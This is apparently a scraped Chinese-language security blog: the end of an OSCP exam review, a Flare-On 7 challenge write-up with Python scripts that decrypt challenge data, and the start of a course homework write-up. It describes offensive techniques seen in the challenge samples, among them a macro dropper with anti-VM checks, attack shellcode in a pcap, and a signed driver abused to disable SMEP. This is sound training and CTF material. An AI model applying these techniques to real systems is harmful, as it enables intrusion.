都會有點小問題，主要的問題是 reverse shell 可能沒辦法直接從裡面彈到最外面來，或是主機的某些具有弱點的服務因為防火牆的關係無法從遠端存取時，可以透過 port forwarding 的方式來解決。 18. Active Directory AttacksActive Directory 是 Windows Server 上用來集中管理一個組織裡的使用者、群組、電腦等等的一個服務，中樞是一到多台的 Domain Controller，這部分主要是教如何枚舉及利用 NTLM 或 Kerberos 滲透 Domain 中的其他機器。 19. The Metasploit Framework如何使用 Metasploit Framework，執得一提的是考試中只能選定一台機器使用，不論成功與否，對其他台機器使用會直接失格。 20. PowerShell Empire在 Windows 上面做枚舉或是底層操作非常痛苦，沒有 PowerShell 基本上動不了，Powershell 寫起來基本上就是 C#，寫起來也不是特別輕巧，善用工具可以省下很多時間，PowerShell Empire 就是其中一個。 21. Lab 範例這裡會用 Lab 示範前面提到的全部概念，但這裡的機器並不是那 66 台，所以官方才會說 Lab 有 70 台。 Lab 環境架構的示意圖取自官網，Lab 環境需透過 VPN 才能連上，下面的 Private Student Segment 是給學員使用的 Windows 機器可以任意 revert，不是共用的，裡面包含一些範例使用的工具等等，除此之外的機器都是跟別人共用，所以記得在開打之前先 revert，打完也要記得 revert，我做 Lab 時有一題明明就有防毒軟體，一堆人在論壇上講一些看起來就是用防毒軟體已經被關掉的打法在打… 往上看到 Sandbox 裡面有四台機器，其實就是課程大綱 裡面 Lab 示範的四台，除了這四台之外另外還有 66 台 Lab，Lab 的主要目標是拿到 /root/proof.txt 或是 C:\\Users\\Administrator\\proof.txt 這種高權限的檔案，一開始滲透只能接觸到 Public Network 的機器，打下某些機器後會發現該機器有另外一個網段的 IP 同時也會發現network-secret.txt，這個檔案是用來開啟 Control Panel 跟論壇的對應區塊用的。 Lab 的 Learning Path官方其實有給出一條 Learning Path 給還沒進入狀況的人走，總共 11 台機器，不過我在玩的時候是 12 台，其中一台 JOE 一直是壞的…，看來現在是被拿下來了。 Path 上雖然有標 easy、medium、hard 的難度，但我個人的感覺都是 easy，就是用來掌握一下整個 OSCP 的感覺。 Lab 的御三家 With Pain comes Sufferance and you get Humble 這個超讚的標題是vishnuraj 一篇介紹 OSCP 的文章所用的標題，這三台機器的 hostname 就叫做 Pain、Sufferance、Humble，據說是最難的三台，我解第二台就遇到 Pain，解完真的超氣&#x3D; &#x3D;，但也順便檢討為什麼基本的枚舉自己沒做完全，我是推薦去把這三台做完再去考試，把 Pain 做掉就好了，後面兩台應該是超過考試範圍了。 Lab 的注意事項因為 Lab 就是模擬一次真正的滲透測試，所以這整個假想的組織裡面的使用者跟電腦也都是息息相關的，包含他們的帳號密碼，所以每打完一台機器都要記得搜刮所有的 credential，在 Learning Path 裡面就已經有機器是相依的，如果沒有 credential 基本上做不出來。 這也就是為什麼我們只有完成 58 台機器，因為剩下的好幾台機器都需要用到上一台機器搜刮出來的 credential 才能登入，接下來才是提權，最後的這整組機器的相依性是從 Develop department 的兩台機器串到 Public Network 的三台機器，然後再串回 IT 部門，我們是卡在那邊看論壇才知道…，不過 IT 裡面有一台 nina 就真的是單純來不及打。 加分項目更前面有提到通過考試要 70 分，但如果提交 Lab 的 writeup 是有機會加五分的，writeup 的詳細程度要跟考試提交的報告一樣詳細，聽起來極度麻煩，所以我沒做，此外 Alpha、Beta 兩台機器因為教材裡面有教學所以不需要交。 考試準備及注意事項Lab 結束之後在 120 天之內可以預約考試，建議早一點選時間，不然會剩下很爛的時間，例如什麼半夜兩點開始，我是選 2&#x2F;5 早上九點，所以考試就是持續到 2&#x2F;6 早上九點，考試的時候基本上是 24 小時被監控的狀態，webcam 是必備設備，只要清晰到可以看得到護照上的資料就沒問題了，考試時考生前 15 分鐘連進一個有聊天室功能的監考網頁，這段時間監考官會要求讓他看一下環境，然後提醒不能使用手機等，所以實際考試時間是 23 小時 45 分鐘，接下來的時間裡監考官會輪班盯著你的傻臉跟螢幕看。 有一點要注意的是設定好 VPN 之後會需要跑 script 紀錄網路設定然後貼給監考官看，因為這門課就叫做 PWK 所以所有東西在 Kali 下運行一定是沒問題的，包括這個 script 本來就是針對 Linux 寫的，如果考試不想出包直接用 Kali 最保險，其他考試需要注意的東西大概如下： Writeup 需要截圖，24 小時一到 vpn 就會斷掉，沒有機會補圖，記得一直截圖，但是不行錄影 Exploit 跟公開的版本如果沒差別只要附上 URL ，有差別則要指明哪裡有修改、為何要修改 需要提權的機器有 local.txt 跟 proof.txt 兩個檔案，差別在有沒有提權，根據我的經驗跟其他人的分享，拿到 local.txt 可以拿一半的分數（官方沒說） 必須拿到 interactive shell 並且在不移動 proof.txt 的情況下印出來才合法，所以 LFI 拿 proof 不算數 必須附上包含 cat proof.txt 以及 ifconfig 或 ipconfig 或 ip a 的截圖進 writeup，否則可能會被扣分或歸零 禁止事項 Spoofing，如 IP spoofing、ARP spoofing、DNS spoofing 那類 Commercial 版的工具，如 Metasploit Pro、Burp Pro，可以類推 IDA Pro 也是，但也用不到就是了 自動化 exploit 工具，如 SQLmap 那類的 大範圍弱掃，如 Nessus 那類的 從考試環境下載任何檔案 Metasploit 的 Auxiliary、Exploit、Post 模組只能對一台自選的機器使用，無論有沒有成功都不能換目標，包含 exploit check，建議要用的時候在聊天室跟監考官說一下 下面四個工具不受限於 Metasploit 只能對一台使用的限制 exploit&#x2F;multi&#x2F;handler msfvenom pattern_create.rb pattern_offset.rb 考試會有五題共 100 分的題目，配分是 10、20、20、25、25，一定有一題 25 分的 BOF 題，結合禁止事項的第五點，恩，可以想想看會發生什麼事，還有就是題目會塞很多誤導的東西，時間控管很重要。 考試結束之後，學員有另外 24 個小時可以撰寫報告，這個報告的定位是寫給甲方看的那種報告，包括非技術細節及屁話，這裡是官方的樣板，我個人是用社群的樣板，步驟要詳細到可以 copy paste 就重現。 最有趣的大概就是一直用第三人稱寫報告超級中二的，例如： OS-83952 found that the CMS is prone to LFI 之類的，呵呵。 還有一個就是 rdesktop 如果是考試的網路環境，我在 MacOS 上面用畫面會撕裂，慢到幾乎不可用，但在 Kali 裡面加上選項 -P -z 速度差超多&#x3D; &#x3D;…，總之如果出事就回去用 Kali 就對了。 免費資源這些是之前調查時整理出來的免費資源，雖然不是每個我都用過，但就統一放在這裡吧 Kali Training，官方自己維護的 Kali 線上課程。 Metasploit Unleashed，官方自己維護的 Metasploit 教學。 Basic Linux Privilege Escalation，很多人在論壇裡面也推薦，根據論壇紀錄，作者 g0tmi1k 也是 OffSec 的員工。 OSCP: Developing a Methodology，我在整理這篇文章的時候才查到，滿完整的工具整理。 Unofficial OSCP Approved Tools，同上。 自動枚舉腳本 (建議一開始做 Lab 先不要用，自己熟悉一下提權的枚舉流程，也不要只用單一腳本，記得交叉檢查) Linux LinEnum LinPEAS Linux Smart Enumeration Windows WinPEAS PrivescCheck CheatSheets PayloadAllTheThings Windows-Post-Exploitation Red Teaming Experiments Active Directory Exploitation Cheat Sheet 練習平台因為官方的 Lab 滿貴的，所以很多人會選擇比較便宜或是免費的替代方案，我自己是把官方的 Lab 做完就半死不活了。 HackTheBox VulnHub RootMe 我完成的機器（照解題序) # Hostname Remarks 1 Phoenix 2 Pain 3 Alpha Learning Path 4 Beta Learning Path 5 Bob 6 Ralph 7 Sean Learning Path 8 Leftturn 9 Break 10 Chris Learning Path 11 Susie Learning Path 12 Mailman Learning Path 13 Disco Learning Path 14 svclient08 15 Luigi Admin dep 16 SV-DC01 17 sv-file01 18 svclient73 19 fc4 20 Jd 21 Tricia Admin dep 22 Harry Admin dep 23 Jack Admin dep 24 Mario Admin dep 25 Shared IT dep 26 1nsider 27 Alice Learning Path 28 Bethany Learning Path 29 gh0st 30 Pi 31 Timeclock Develop dep 32 Mike 33 Kaitlyn Admin dep 34 Ekzameno Admin dep 35 Adam Develop dep 36 John Develop dep 37 Carol Develop dep 38 Gamma 39 XOR-APP59 Learning Path 40 XOR-APP23 41 XOR-APP07 42 XOR-DC01 43 Tophat 44 Dotty 45 Mail 46 Peter 47 Pedro 48 Bruce 49 Maria 50 Hotline Learning Path 51 Sufferance 52 Jeff 53 DJ 54 Humble 55 Core 56 Kraken 57 James Develop dep 58 Manager Develop dep 心得跟一些雜七雜八的東西一開始打 Lab 的時候真的會不小心掉進打 CTF 的思考習慣裡面，尤其有 Web Application 的機器除了提權的部分，整個感覺還是跟 CTF 相似的，不過心理上習慣 Lab 的形式之後就會慢慢有自己的手順了，看到 Web 除了先自己戳洞在哪，先找 Public Exploitation 不管在實務上還是 Lab 裡都是必要的步驟，找不到就算了，但找到可以節省很多時間。 OSCP 整體的難度我覺得還是算偏低的，Web Application 的部分最難最難也就只有要想辦法 LFI to RCE，對於平常有在把玩的人應該是不成問題，論壇上甚至還有人是需要依靠 commix 才做得出基本的 command injection 題….，再來就是 Lab 所需的知識或是常識 (?) 並不一定包含在教材裡面，有很多道題目是我本來就試過或知道的梗，但另外一些就真的是學習了…建議還是把 Lab 都摸一遍比較划算一點，用身體學來的教訓記的比較久。 另外一個收穫大概是看了一堆英文的屁話跟藏頭…因為論壇發言會被審查，具體的工具或是服務會被 &lt;spoiler&gt; 替換，或者是 SMB 變成 S*** 之類的，所以有些人會用更有創意一點的方式來自我審查？例如 .ps1 就會變成 PlayStation1、Metasploit 變成 The Forbidden Tool、Powershell Empire 變成 Darth Vader 等等，還有更多第一眼看到不知道在寫什麼鬼，但是解完看到會笑出來的英文詩，挺有收穫的…? 接下來就是等我那張在疫情風暴下不知道什麼時候才會來的證照… 結果比我想的還要有效率，他們用 DHL 從菲律賓寄過來，東西 3&#x2F;3 就已經躺在我家了，只是清明連假我才回家把它打開，酷…","categories":[{"name":"Record","slug":"Record","permalink":"http://blog.terrynini.tw/categories/Record/"}],"tags":[{"name":"OSCP","slug":"OSCP","permalink":"http://blog.terrynini.tw/tags/OSCP/"}]},{"title":"2020::Flare-On 7::Write-up","slug":"2020-Flare-On-7-Write-up","date":"2020-10-22T06:57:07.000Z","updated":"2024-06-20T16:45:57.876Z","comments":true,"path":"tw/2020-Flare-On-7-Write-up/","permalink":"http://blog.terrynini.tw/tw/2020-Flare-On-7-Write-up/","excerpt":"喔耶，雖然名次沒有很讚，但還是破台了，又看了一堆奇技淫巧🤔️今年前面打的太悠閒，導致 11 題差點解不掉，哭啊…這次解題邊解邊把 writeup 捏的差不多了，順手來發一篇","text":"喔耶，雖然名次沒有很讚，但還是破台了，又看了一堆奇技淫巧🤔️今年前面打的太悠閒，導致 11 題差點解不掉，哭啊…這次解題邊解邊把 writeup 捏的差不多了，順手來發一篇 心得根據官方的統計數據，今年度台灣總共有 4 個人破台，但這個數據有點失真，因為就我所知至少還有兩個人破台但是沒掛台灣國籍，但也看得出來大家越來越忙，2019 年的時候還有 8 個人。 就看得到的結果來說，我是第 2 個破台的台灣人，不過跟第一名的 Lays 實在是差有點遠🤔️，這次官方還很有趣的統計了國家的人均破台率，我個人是覺得看完笑笑就好了，但新加坡的數字還真是可怕。 是說寫這種 writeup 都有點麻煩，寫到超級詳細讓沒有打的人都看得懂當然是可行，但是時間成本太高了，所以我就在這裡留個大概，如果真的有人用 Flare-On 在練習 reversing 的時候看不懂的話，可以直接戳我沒關係。 今年的 badge 是鑰匙，挺酷酷的： 1 - fidlerDescription Welcome to the Seventh Flare-On Challenge!This is a simple game. Win it by any means necessary and the victory screen will reveal the flag. Enter the flag here on this site to score and move on to the next level.This challenge is written in Python and is distributed as a runnable EXE and matching source code for your convenience.You can run the source code directly on any Python platform with PyGame if you would prefer.*7zip password: flare Solution從圖片上看得出來是使用 PyInstaller 打包過的程式，直接找用工具把 python bytecode 抽出來，PyInstaller Extractor： 同時運行程式看一下有什麼目標，看起來是要先找密碼： 從剛剛 decompile 來的 python code 可以知道密碼是「ghost」： fidler.py 14151617def password_check(input): altered_key = &#x27;hiptu&#x27; key = &#x27;&#x27;.join([chr(ord(x) - 1) for x in altered_key]) return input == key 看起來是 pygame，遊戲模式類似 Cookie Clicker 直接 call 解密 flag 的地方： fidler.py 249250251252if __name__ == &#x27;__main__&#x27;: target_amount = 103079215104 print(decode_flag(int(target_amount / 100000000)))#idle_with_kitty@flare-on.com 2 - garbageDescription One of our team members developed a Flare-On challenge but accidentally deleted it.We recovered it using extreme digital forensic techniques but it seems to be corrupted.We would fix it but we are too busy solving today’s most important information security threats affecting our global economy.You should be able to get it working again, reverse engineer it, and acquire the flag.*7zip password: flare Solution直接執行題目給的 garbage.exe ， windows 直接跳錯誤在臉上： 檢查 PE Header 的各種欄位看起來沒什麼問題，但檢查 Section header 會發現，這是一隻由 UPX 壓縮過的程式，同時最後一個 .rsrc 的 size 不對，根據題目敘述，這裡可以合理推斷該地方的數據遺失，直接 xxd garbage.exe 可以看到尾端的 xml 被截斷了所以沒有閉合： 00009e40: 0904 0000 4800 0000 5c90 0100 7d01 0000 ....H...\\...&#125;...00009e50: 0000 0000 0000 0000 6050 0100 3c3f 786d ........`P..&lt;?xm00009e60: 6c20 7665 7273 696f 6e3d 2731 2e30 2720 l version=&#x27;1.0&#x27;00009e70: 656e 636f 6469 6e67 3d27 5554 462d 3827 encoding=&#x27;UTF-8&#x27;00009e80: 2073 7461 6e64 616c 6f6e 653d 2779 6573 standalone=&#x27;yes00009e90: 273f 3e0d 0a3c 6173 7365 6d62 6c79 2078 &#x27;?&gt;..&lt;assembly x00009ea0: 6d6c 6e73 3d27 7572 6e3a 7363 6865 6d61 mlns=&#x27;urn:schema00009eb0: 732d 6d69 6372 6f73 6f66 742d 636f 6d3a s-microsoft-com:00009ec0: 6173 6d2e 7631 2720 6d61 6e69 6665 7374 asm.v1&#x27; manifest00009ed0: 5665 7273 696f 6e3d 2731 2e30 273e 0d0a Version=&#x27;1.0&#x27;&gt;..00009ee0: 2020 3c74 7275 7374 496e 666f 2078 6d6c &lt;trustInfo xml00009ef0: 6e73 3d22 7572 6e3a 7363 6865 6d61 732d ns=&quot;urn:schemas-00009f00: 6d69 6372 6f73 6f66 742d 636f 6d3a 6173 microsoft-com:as00009f10: 6d2e 7633 223e 0d0a 2020 2020 3c73 6563 m.v3&quot;&gt;.. &lt;sec00009f20: 7572 6974 0a urit. 總之就是把 IAT 修好，讓 UPX 找得到需要用的 Dll 跟對應的 function，因為是執行檔所以 relocation 可以不管，修好的 binary 我放在這裏，直接執行就會生成名為 sink_the_tanker.vbs 的腳本負責把 flag 直接印出來： 3 - wednesdayDescription Be the wednesday. Unlike challenge 1, you probably won’t be able to beat this game the old fashioned way. Read the README.txt file, it is very important. README.txt 123456789101112131415161718192021██╗ ██╗███████╗██████╗ ███╗ ██╗███████╗███████╗██████╗ █████╗ ██╗ ██╗██║ ██║██╔════╝██╔══██╗████╗ ██║██╔════╝██╔════╝██╔══██╗██╔══██╗╚██╗ ██╔╝██║ █╗ ██║█████╗ ██║ ██║██╔██╗ ██║█████╗ ███████╗██║ ██║███████║ ╚████╔╝██║███╗██║██╔══╝ ██║ ██║██║╚██╗██║██╔══╝ ╚════██║██║ ██║██╔══██║ ╚██╔╝╚███╔███╔╝███████╗██████╔╝██║ ╚████║███████╗███████║██████╔╝██║ ██║ ██║ ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝ ╚═══╝╚══════╝╚══════╝╚═════╝ ╚═╝ ╚═╝ ╚═╝ --- BE THE WEDNESDAY --- S M T DUDE T F S --- Enable accelerated graphics in VM --- --- Attach sound card device to VM --- --- Only reverse mydude.exe --- --- Enjoy it my dudes ---% Solution從 dll 可以知道是用 SDL 捏出來的遊戲，打開個五分鐘大概就能抓到規則，只要有 M 這個箱子就必須從箱子的下面通過，否則就一定要從上面跳過去： 稍微看一下 binary 可以發現這個程式是用 nim 撰寫的，他的特色是會被編譯成等價的 C 或是 C++ 等語言，總之不同於 bytecode，nim 造出來的檔案是無法直接 decompile 的，不過 function 的 symbol 倒是沒有全部都拔除，可以粗略的猜得出相關功能： 這裏直接從碰撞判定下手，在 onCollide__9byAjE9cSmbSbow3F9cTFQfLg 中可以發現角色的碰撞判定以及分數判定，function 的上半部（不在圖片上）是角色直接碰撞箱子本體的情況，無視，直接把下半段關於 M 箱子判斷的 if 條件式（截圖中最上面的那條 if） patch 成一定會進入加分的程式碼，同時可以在 update__Arw3f6ryHvqdibU49aaayOg 的最下面知道分數到達 296 之後可以看到 flag： patch 完之後就無腦玩，一直蹲下直到分數到 296 就好了，直接用 cheat engine 做加速： The video tag is not supported by your browser. 4 - reportDescription Nobody likes analysing infected documents, but it pays the bills. Reverse this macro thrill-ride to discover how to get it to show you the key. Solution看起來是 office 的巨集病毒，少東西所以不會真的執行，直接看巨集的部分，大部分的東西都是簡單的 encode，首先把一些物件用到的字串解出來，其中可以看到有些字串並沒有真的被使用到，可能需要猜一下被拿去做了什麼事情： string.py 12345678910111213141516171819202122232425262728293031323334353637def rigmarole(a): t = &#x27;&#x27; for i in range(0,len(a),4): t += chr(int(a[i:i+2],16)-int(a[i+2:i+4],16)) return tdef folderol(): onzo = &quot;9655B040B64667238524D15D6201.B95D4E01C55CC562C7557405A532D768C55FA12DD074DC697A06E172992CAF3F8A5C7306B7476B38.C555AC40A7469C234424.853FA85C470699477D3851249A4B9C4E.A855AF40B84695239D24895D2101D05CCA62BE5578055232D568C05F902DDC74D2697406D7724C2CA83FCF5C2606B547A73898246B4BC14E941F9121D464D263B947EB77D36E7F1B8254.853FA85C470699477D3851249A4B9C4E.9A55B240B84692239624.CC55A940B44690238B24CA5D7501CF5C9C62B15561056032C468D15F9C2DE374DD696206B572752C8C3FB25C3806.A8558540924668236724B15D2101AA5CC362C2556A055232AE68B15F7C2DC17489695D06DB729A2C723F8E5C65069747AA389324AE4BB34E921F9421.CB55A240B5469B23.AC559340A94695238D24CD5D75018A5CB062BA557905A932D768D15F982D.D074B6696F06D5729E2CAE3FCF5C7506AD47AC388024C14B7C4E8F1F8F21CB64&quot;.split(&quot;.&quot;) for idx, i in enumerate(onzo): print(idx,i) print(f&quot;onzo[&#123;idx&#125;] = &#123;rigmarole(i)&#125;&quot;)folderol()# 0 9655B040B64667238524D15D6201# onzo[0] = AppData# 1 B95D4E01C55CC562C7557405A532D768C55FA12DD074DC697A06E172992CAF3F8A5C7306B7476B38# onzo[1] = \\Microsoft\\stomp.mp3# 2 C555AC40A7469C234424# onzo[2] = play# 3 853FA85C470699477D3851249A4B9C4E# onzo[3] = FLARE-ON# 4 A855AF40B84695239D24895D2101D05CCA62BE5578055232D568C05F902DDC74D2697406D7724C2CA83FCF5C2606B547A73898246B4BC14E941F9121D464D263B947EB77D36E7F1B8254# onzo[4] = Sorry, this machine is not supported.# 5 853FA85C470699477D3851249A4B9C4E# onzo[5] = FLARE-ON# 6 9A55B240B84692239624# onzo[6] = Error# 7 CC55A940B44690238B24CA5D7501CF5C9C62B15561056032C468D15F9C2DE374DD696206B572752C8C3FB25C3806# onzo[7] = winmgmts:\\\\.\\root\\CIMV2# 8 A8558540924668236724B15D2101AA5CC362C2556A055232AE68B15F7C2DC17489695D06DB729A2C723F8E5C65069747AA389324AE4BB34E921F9421# onzo[8] = SELECT Name FROM Win32_Process# 9 CB55A240B5469B23# onzo[9] = vbox# 10 AC559340A94695238D24CD5D75018A5CB062BA557905A932D768D15F982D# onzo[10] = WScript.Network# 11 D074B6696F06D5729E2CAE3FCF5C7506AD47AC388024C14B7C4E8F1F8F21CB64# onzo[11] = \\Microsoft\\v.png 繼續往下看可以發現，巨集會解密一段 data 然後儲存為 stomp.mp3，寫個 python 模仿他解密，但我們得到的音檔聽起來跟 flag 一點關係也沒有，不過可以注意到這裡也有部分的 data 是完全沒有被使用到的： decrypt.py 123456f = open(&quot;./T&quot;,&#x27;r&#x27;).read().strip()key = [0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,0x99,0xaa,0xbb,0xcc,0xdd,0xee]kuffle = bytes([(int(f[i:i+2],16) ^ key[(i//4)%len(key)]) for i in range(0,168667*4,4)])with open(&quot;stomp.mp3&quot;,&#x27;wb&#x27;) as z: z.write(kuffle) 沒有用到的是 data 的另外一半，以及一些字串 \\Microsoft\\v.png，FLARE-ON，如果把 data 抽出來，然後假設檔頭是 PNG 的格式，就可以發現 xor 出來的結果是 NO-E，所以可以直接猜 key 就是 &quot;FLARE-ON&quot;[::-1]，直接寫腳本解： flag.py 123456f = open(&quot;./T&quot;,&#x27;r&#x27;).read().strip()key = b&#x27;FLARE-ON&#x27;[::-1]kuffle = [int(f[i:i+2],16) ^ key[((i-2)//4)%len(key)] for i in range(2,len(f),4)]with open(&quot;flag.png&quot;,&#x27;wb&#x27;) as z: z.write(bytes(kuffle)) 然後就拿到 flag 的圖片了： 5 - TKAppDescription Now you can play Flare-On on your watch! As long as you still have an arm left to put a watch on, or emulate the watch’s operating system with sophisticated developer tools. Solution一樣是滿無聊的一題，題目給的是 Galaxy Watch 的應用程式，但動態並沒有什麼明顯的好處，先直接靜態理解一下，直接解壓縮 TKApp.tpk 後走走看看，應該能夠確定應用程式的部分是 .NET 程式： ExifLib.Standard.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS WindowsTKApp.dll: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS WindowsTizen.Wearable.CircularUI.Forms.Renderer.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS WindowsTizen.Wearable.CircularUI.Forms.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS WindowsXamarin.Forms.Core.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS WindowsXamarin.Forms.Platform.Tizen.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS WindowsXamarin.Forms.Platform.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS WindowsXamarin.Forms.Xaml.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows 總之拿個 .NET 的 decompiler 看一下，程式拿一堆字串來當作 AES 的 key，用來解出 flag，所有的東西都能直接找到，去找 app description，圖片的 exif 資訊等等，然後身為 cipher 的 Runtime.dll 則是直接躺在 TPK.dll 裡面，直接寫解密 decrypt.py 1234567891011from Crypto.Cipher import AESfrom hashlib import sha256from base64 import *IV = b&#x27;NoSaltOfTheEarth&#x27;key = b&#x27;the kind of challenges we are gonna make here&#x27;cipher = open(&quot;Runtime.dll&quot;,&#x27;rb&#x27;).read()decryptor = AES.new(sha256(key).digest(),AES.MODE_CBC,iv=IV)f = decryptor.decrypt(cipher)with open(&quot;flag.png&quot;,&#x27;wb&#x27;) as flag: flag.write(b64decode(f)) 6 - codeitDescription Reverse engineer this little compiled script to figure out what you need to do to make it give you the flag (as a QR code). Solutionbinary 是一個會把輸入做成 QRcode 之後用圖片展示出來程式，看起來是這樣 觀察一下 binary 裡面的字串不難發現這是一個從 AutoIt 編譯而來的程式，隨便找一下就可以找到工具 能夠做到 extract byte code 跟 decompile byte code，這裡我是用 AutoIt-Ripper 程式碼算是重度混淆，不過最後的邏輯是這樣的，使用 Windows API GetComputerNameA 先取得電腦名字，然後對其做 SHA-256 之後可以得到一個 hash，之後用在印出真的 QRcode 之前，程式會先偷偷用這個 hash 當作 AES 的 key 來解密一個 cipher，如果解出來的起頭是 FLARE 且同時結尾是 ERALF 時，程式會直接把解出來的東西當作 QRcode 用圖片展示出來，否則就展示本來的輸入所對應的 QRcode，也就是說我們要找到正確的 ComputerName。 在 227 行附近可以看到一些 bitwise 的操作（ function 我重命名過了）： script.au3 227228229230231232233234235236237238239240241242243244245246247248249250251252253FUNC readSpriteBmp ( BYREF $computerName ) LOCAL $FLQVIZHEZM = InstallFile ( 14 ) LOCAL $FLFWEZDBYC = createFile ( $FLQVIZHEZM ) IF $FLFWEZDBYC &lt;&gt; - $FLTGQYKODM THEN LOCAL $FLVBURIUYD = _GetFileSize_ ( $FLFWEZDBYC ) IF $FLVBURIUYD &lt;&gt; - $FLTMXODMFL AND DLLSTRUCTGETSIZE ( $computerName ) &lt; $FLVBURIUYD - 54 THEN LOCAL $FLNFUFVECT = DLLSTRUCTCREATE (_Hex2Str_( &#x27;struct;byte[&#x27; &amp; &#x27;269156&#x27; &amp; &#x27;];endstruct&#x27;) LOCAL $FLSKUANQBG = ReadFile ( $FLFWEZDBYC , $FLNFUFVECT ) IF $FLSKUANQBG &lt;&gt; - $FLVUJARIHO THEN LOCAL $FLXMDCHRQD = DLLSTRUCTCREATE ( &#x27;struct;byte[54];byte[&#x27; &amp; $FLVBURIUYD - 54 &amp; &#x27;];endstruct&#x27;, DLLSTRUCTGETPTR ( $FLNFUFVECT ) ) LOCAL $FLQGWNZJZC = 1 LOCAL $FLOCTXPGQH = &#x27;&#x27; FOR $FLTERGXSKH = 1 TO DLLSTRUCTGETSIZE ( $computerName ) LOCAL $FLYDTVGPNC = NUMBER ( DLLSTRUCTGETDATA ( $computerName , 1 , $FLTERGXSKH ) ) FOR $FLTAJBYKXX = 6 TO 0 STEP -1 $FLYDTVGPNC += BITSHIFT ( BITAND ( NUMBER ( DLLSTRUCTGETDATA ( $FLXMDCHRQD , 2 , $FLQGWNZJZC ) ) , 1 ) , -1 * $FLTAJBYKXX ) $FLQGWNZJZC += 1 NEXT $FLOCTXPGQH &amp;= CHR ( BITSHIFT ( $FLYDTVGPNC ,1) + BITSHIFT ( BITAND ( $FLYDTVGPNC ,1) , -7 ) ) NEXT DLLSTRUCTSETDATA ( $computerName , 1 , $FLOCTXPGQH ) ENDIF ENDIF CloseHandle ( $FLFWEZDBYC ) ENDIF DeleteFileA ( $FLQVIZHEZM )ENDFUNC 他做的事情就是把一開始看到的那個在敲鍵盤的 flare icon 的每 7bits 組起來，這聽起來就是 ASCII，所以如果我們照做的話就可以抽出這段字 aut01tfan1999 這就是正確的電腦名稱，最後就是看要直接改 ComputerName 還是 Hook Function，或是直接解密都行。 Flag: L00ks_L1k3_Y0u_D1dnt_Run_Aut0_Tim3_0n_Th1s_0ne!@flare-on.com 下面的題目忘記截圖…，雖然都記得很清楚，但是懶得寫ㄌ，我就寫個大概就好了，反正有官方 writeup，2ㄏ2ㄏ。 7 - re_crowd會拿到一個 pcap 檔案，實際上是攻擊者在用 CVE 攻擊伺服器並且偷檔案，裏面包含 alphanumeric unicode shellcode 把它倒出來分析看懂就好了，解完 RC4 就可以得到 flag。 8 - Aardvark這支程式利用 wsl 叫起一個 ELF 執行檔（放在 PE resource 裏面），之後用 UNIX Socket 溝通來玩 OOXX（Tic-tac-toe） 的遊戲，由於 Tic-tac-toe 在玩家都下最佳位置時是必定平手的遊戲，解法就是把 ELF 裏面初始化遊戲盤面的地方改成預先放一堆 O 這樣就必勝了。 9 - crackinstallercrackinstaller 會先安裝一個有簽章且能繞過 SMEP 的 driver 之後透過這個 driver 安裝一個沒有簽章的 driver，目標是要在登錄檔裡面寫上正確的密碼然後寫一個 COM 的 Client 跟 crackinstaller 安裝的 COM 做互動，最後就可以拿到 flag。 比較有趣的點是「一個有簽章且能繞過 SMEP 的 driver 」，一開始我解完題目後一直覺得裡面的 magic number 感覺可以直接查到，搞不好我不用花這麼多時間逆向，結果發現這東西根本就是卡普空的東西，PC 版的 Street Fighter V 的 driver 而且他唯一的功能就是把 SMEP 關掉然後跳上 userland 執行任意程式，天啊卡普空… 10 - break簡單來說就是執行主要程式後，主要程式會 fork B 來 debug 自己，B 會 fork C 來 debug 自己，邏輯都被往下外包，因為 C 很簡單，所以可以把那些功能都 patch 回 B，這樣就可以用 gdb 跟 B 在做什麼了，就醬子，後面就想辦法搞一搞就會有 flag 了。 11 - rabbithole非常惡劣，極盡我通靈之能把全部的樣本都看完了，但其實不用看 32bit 那一部分的 1x 個 payload，總之裡面的 PE 檔案都被 PX 這個算法給包起來了，首先要先寫腳本把他們好好解開，然後就可以看懂 dll 之間互相呼叫，被加密的 flag 在 DiMap 這個登錄檔裡面，解開就是了。","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://blog.terrynini.tw/tags/Reverse/"},{"name":"Flare-On","slug":"Flare-On","permalink":"http://blog.terrynini.tw/tags/Flare-On/"}]},{"title":"2020::程式安全::HW0 Write-up","slug":"2020-程式安全-HW0-Write-up","date":"2020-09-25T00:00:00.000Z","updated":"2024-06-20T16:45:57.084Z","comments":true,"path":"tw/2020-程式安全-HW0-Write-up/","permalink":"http://blog.terrynini.tw/tw/2020-%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW0-Write-up/","excerpt":"早安是我拉ฅ(&#x3D;ˇωˇ&#x3D;)ฅ，今年又是助教拉，騙個流量，感恩。","text":"早安是我拉ฅ(&#x3D;ˇωˇ&#x3D;)ฅ，今年又是助教拉，騙個流量，感恩。 Eekum BokumRecon首先可以先跟程式互動一下掌握功能，總之看起來是一個 n-puzzle game，值得一提的是，這個遊戲的 16 個方塊總共可以組成 $16!$ 個開局（可動塊不一定要在右下），其中洽有一半無解，因為我們遊戲過程中只能使用上下左右，組合出來的是一個交錯群，但這個起始盤面 16 號在右下且只有一次置換，不可能有解，所以別玩了，好好逆向好ㄇ： 總之先嘗試 file 它，可以發現他是 .Net assembly： $file EekumBokum.exeEekumBokum.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows .Net 跟 JVM 類似，基本上就是一個執行 bytecode 的環境，bytecode 的好處除了方便移植到各個平台外，還非常好逆向(?)，這裡可以用 dnSpy 來幫助解題，匯入後長這樣： 總之 Program 是程式的入口點，他會叫起 Form1 也就是我們所看到的介面，直接打開來看，可以看得到建構式應該是在排遊戲盤面： 171819202122232425262728293031323334353637383940414243444546474849public Form1()&#123; this.InitializeComponent(); this.idxMovable = 15; this.originalPicture.AddRange(new Bitmap[] &#123; Resources.EekumBokum_1, Resources.EekumBokum_2, Resources.EekumBokum_3, 